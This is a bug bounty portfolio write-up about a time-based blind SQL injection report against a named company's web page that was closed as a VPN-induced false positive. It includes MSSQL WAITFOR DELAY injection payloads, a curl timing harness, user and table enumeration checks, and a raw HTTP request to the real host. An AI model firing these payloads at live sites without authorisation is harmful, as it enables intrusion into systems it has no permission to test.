# Time-Based Blind SQLi Research — Methodology, False Positive & Integrity

**Status:** Closed as *Not Applicable* (false positive) — REA Group — Jan 2026  
**VRT:** Server-Side Injection > SQL Injection (P1 claimed)  
**Result:** Demonstrated ability to hunt time-based SQLi + owned up to VPN-induced false positive, triage positive feedback.

## What This Shows (for hiring managers)

- **Can hunt time-based blind SQLi** — crafted `WAITFOR DELAY` payloads, enumerated users/tables, raw HTTP PoCs with curl.
- **Owns up if wrong** — re-tested without VPN (0.77s vs 0.77s, no delay), admitted false positive immediately.
- **Triage feedback positive** — `theartisan_bugcrowd: "Your effort is appreciated and we hope that you will continue to research..."` — integrity noted.

> **Disclosure note:** Engagement does not allow public disclosure. Target anonymized, details NDA. Methodology shown, not exploitable data. Full technical package available on request under NDA.

## Methodology (what was tested)

**Endpoint:** `GET /about-us/business-and-brands/?RID=320` — Microsoft SQL Server suspected.

**Payloads tested (time-based):**
```
RID=320'; WAITFOR DELAY '00:00:07'-- -
RID=320'; IF (USER_NAME()='sa') WAITFOR DELAY '00:00:07'-- -
RID=320'; IF EXISTS(SELECT * FROM wp_users) WAITFOR DELAY '00:00:07'-- -
```

**CURL harness (≤3 req/s, no RAHAD header during testing):**
```bash
time curl -G "https://target/about-us/business-and-brands/" \
  --data-urlencode "RID=320'; WAITFOR DELAY '00:00:07'-- -" -s -o /dev/null
```

**Enumeration loops:** users (`sa,dbo,admin...`), tables (`wp_users,users,posts,orders,wp_options`), `LEN(DB_NAME())`, `USER_NAME()` checks with timing baseline ~4s vs injected ~11s.

**Raw HTTP provided to triage (copy-paste ready):**
```
GET /about-us/business-and-brands/?RID=320%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A07%27--%20- HTTP/1.1
Host: www.rea-group.com
```

## Why It Was False Positive (lesson)

- **Initial:** VPN with 300ms+ jitter → random 7-11s delays misread as `WAITFOR` (baseline 4s + 7s).
- **Re-test without VPN:** `0.77s vs 0.77s` — no delay, confirmed via `jan_bugcrowd` reproduction (no 7s, no 30s).
- **Lesson logged:** Always test timing payloads **without VPN / stable network**, baseline 3×, then inject, use `PGCONNECT_TIMEOUT`-style controls.

## Triage Interaction (positive)

- **Tal_Bugcrowd:** requested DB/table names, suggested time-payload PoC.
- **jan_bugcrowd:** requested raw HTTP, reproduced — `this dont wait for 7 seconds` — professional.
- **You:** owned up same day `2026-01-15 21:47` — `I sincerely apologize... high-latency VPN... NO timing difference... false positive... learned lesson`.
- **theartisan_bugcrowd (close):** `We believe this issue to be a false-positive... Your effort is appreciated and we hope that you will continue...`

Shows **rigour + integrity** — hiring signal over a bounty.

## Portfolio Takeaway

- **Skill:** Time-based SQLi hunting (MSSQL `WAITFOR DELAY`, enumeration, raw HTTP)
- **Integrity:** Immediate false-positive admission, lesson documented
- **Triage:** Concise, reproducible, raw request + curl loops — even when wrong, triage thanked effort

*Full evidence package (screenshots, sqli.txt, tablenames.png) kept private under NDA — available for interview demo.*
